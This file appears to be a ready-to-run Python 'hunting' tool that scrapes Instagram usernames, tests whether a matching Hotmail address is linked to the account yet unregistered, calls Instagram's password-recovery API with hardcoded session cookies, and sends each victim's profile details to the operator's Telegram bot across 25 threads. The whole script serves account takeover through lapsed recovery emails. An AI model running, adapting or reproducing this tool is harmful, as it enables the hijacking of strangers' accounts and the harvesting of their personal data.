import Topython
import requests
import os
import random
import threading
import telebot
import webbrowser
import requests;import hashlib;import pyfiglet;import hmac;import time
from datetime import datetime
script_version = '1.0.0'
current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
print(f"\x1b[38;5;190m     \t           Script Version: {script_version}")
print(f"\x1b[38;5;174m             Date and Time: {current_datetime}")
print("\x1b[38;5;150m               Script programmed by Raven")
text = "      Raven"
fig = pyfiglet.Figlet(font='slant')
formatted_text = fig.renderText(text)
print("\x1b[38;5;99m" + formatted_text + "\x1b[0m")
print("\x1b[38;5;228m")
BOT_TOKEN = input(' TOKEN : ')
print('')
CHAT_ID = input(' ID : ')
webbrowser.open('https://t.me/ZZKGZ')
bot = telebot.TeleBot(BOT_TOKEN)
os.system('clear')
script_version = '1.0.0'
current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
print(f"\x1b[38;5;190m     \t           Script Version: {script_version}")
print(f"\x1b[38;5;174m             Date and Time: {current_datetime}")
print("\x1b[38;5;150m               Script programmed by Raven")
text = "      Raven"
fig = pyfiglet.Figlet(font='slant')
formatted_text = fig.renderText(text)
print("\x1b[38;5;99m" + formatted_text + "\x1b[0m")
print("\x1b[38;5;228m")
print('—'*25)
print(''' • Its running, go to your bot and send /start  √  
√    تم التشغيل، انتقل إلى البوت الخاص بك وأرسل /start ''')
print('—'*26)
class Checker:
    def __init__(self):
        self.good_ig = 0
        self.bad_ig = 0
        self.good_hot = 0
        self.bad_hot = 0
        self.total_checked = 0

    def check_insta(self, email=None):
        response = Topython.Instagram.CheckEmail(f"{email}@hotmail.com")
        if response:
            self.good_ig += 1
            self.check_gmail(email=email)
        else:
            self.bad_ig += 1
        self.total_checked += 1

    def check_gmail(self, email=None):
        try:
            response = Topython.Email.hotmail(email=email)
            if response:
                self.good_hot += 1
                self.informations(username=email)
            else:
                self.bad_hot += 1
        except Exception as e:
            if "network" in str(e):
                print("Use Vpn")
            else:
                self.gen_users()

    def informations(self, username=None):
        info = Topython.Instagram.information(username=username)
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        }	
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
            rest = response.json().get('email')
        except:
            rest = None
        hunt = f"""
New Bro Good Instagram
ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
Name: {info['name']}
Username: {info['username']}
Email: {username}@hotmail.com
Followers: {info['followers']}
Following: {info['following']}
Id: {info['id']}
Date: {info['date']}
Posts: {info['post']}
Reset: {rest}
ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
BY: @F_M_D • @ZZKGZ
        """
        print(hunt)
        bot.send_message(CHAT_ID, hunt)
    def run(self, email):
        self.check_insta(email)
        status_message = f"""
Welcome To My Tool
ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
✫ Good Hotmail : {self.good_hot}
✫ Bad Hotmail : {self.bad_hot}
✫ Hotmail : {self.total_checked}
✫ Bad insta: {self.good_ig}
✫ Bad Mail : {email}@hotmail.com
ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
BY : @F_M_D •
        """
        bot.edit_message_text(status_message, CHAT_ID, self.status_message_id)
    def gen_users(self):
        Lett = [
            "一右雨円王音下火花学気九休金空月見五口校左三山子四時出女小上森人水正生青夕石先早草足村大男中虫町天田土二日入年白八百文木本名目立力林六",
            "アィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶ",
            "あぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをん",
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ",
            "پچژکگابتثجحخدذرزسشصضطظعغفقكلمنهوي",
        ]
        while True:
            name = random.choice(Lett)
            key = ''.join(random.choice(name) for _ in range(random.randint(2, 4)))
            date = random.choice(["2010", "2011", "2012"])
            keyword = key + date
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
                'x-fb-friendly-name': 'PolarisSearchBoxRefetchableDirectQuery',
            }
            data = {
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableDirectQuery',
                'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+str(keyword)+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
                'server_timestamps': 'true',
                'doc_id': '7778489908879212',
            }
            try:
                response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
                users = response['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
                for user in users:
                    email = user['user']['username']
                    if "_" not in email and len(email) > 5:
                        self.run(email)
            except:
                self.gen_users()

if __name__ == "__main__":
    checker = Checker()

    @bot.message_handler(commands=['start'])
    def welcome(message):
        welcome_message = """
مرحباً بك في بوت الفحص!
جار الآن بفحص المتاحات ...
"""
        sent_message = bot.send_message(message.chat.id, welcome_message)
        checker.status_message_id = sent_message.message_id
        for _ in range(25):
            threading.Thread(target=checker.gen_users).start()
    bot.polling()
